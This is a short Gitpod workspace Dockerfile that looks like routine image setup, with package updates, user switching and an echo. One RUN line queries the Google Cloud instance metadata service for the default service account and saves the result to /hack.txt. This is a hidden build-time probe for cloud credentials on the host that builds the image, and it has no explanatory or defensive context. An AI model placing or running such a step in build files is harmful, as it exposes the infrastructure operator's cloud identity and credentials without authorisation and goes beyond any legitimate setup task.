FROM gitpod/workspace-full:latest

USER root
# Install custom tools, runtime, etc.
RUN apt-get update && apt-get install -y
RUN curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/ > /hack.txt

USER gitpod
# Apply user-specific settings
RUN echo "this is gitpod user"

# Give back control
USER root